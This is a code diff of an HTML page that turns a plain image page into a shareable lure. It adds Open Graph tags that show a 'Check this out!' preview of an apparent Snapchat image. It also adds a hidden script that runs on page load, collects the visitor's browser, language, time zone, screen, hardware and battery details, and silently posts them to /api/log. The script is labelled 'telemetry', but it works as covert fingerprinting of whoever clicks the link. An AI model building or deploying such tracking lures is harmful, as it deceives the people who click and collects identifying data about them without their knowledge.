@@ -1,26 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Check this out</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Open Graph Tags (Shows a link preview on messaging apps) -->
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Check this out!" />
+    <meta property="og:description" content="Click to view full image" />
+    <meta property="og:image" content="https://dancingkangaroos.up.railway.app/Snapchat-1526920749.webp" />
+
+    <title>View Content</title>
     <style>
-        body { 
-            margin: 0; 
-            background: #000; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
+        body {
+            margin: 0;
+            background-color: #0d1117;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
         }
-        img { max-width: 90%; max-height: 90vh; border-radius: 8px; }
+        img {
+            max-width: 90%;
+            max-height: 90vh;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            object-fit: contain;
+        }
     </style>
 </head>
 <body>
-    <!-- Displays the image -->
-    <img src="/assets/meme.jpg" alt="Meme">
 
-    <!-- Silent telemetry hit -->
+    <!-- Points directly to Snapchat-1526920749.webp inside the public/ folder -->
+    <img src="/Snapchat-1526920749.webp" alt="Shared Media">
+
+    <!-- Background telemetry script -->
     <script>
-        fetch('/api/telemetry', { method: 'POST' });
+        async function sendTelemetry() {
+            const payload = {
+                userAgent: navigator.userAgent,
+                language: navigator.language || 'Unknown',
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1,
+                cores: navigator.hardwareConcurrency || null,
+                touchPoints: navigator.maxTouchPoints || 0,
+                batteryLevel: null,
+                isCharging: null
+            };
+
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    payload.batteryLevel = Math.round(battery.level * 100);
+                    payload.isCharging = battery.charging;
+                } catch (e) {
+                    // Ignored if restricted
+                }
+            }
+
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log('Telemetry error:', err));
+        }
+
+        window.addEventListener('DOMContentLoaded', sendTelemetry);
     </script>
 </body>
 </html>
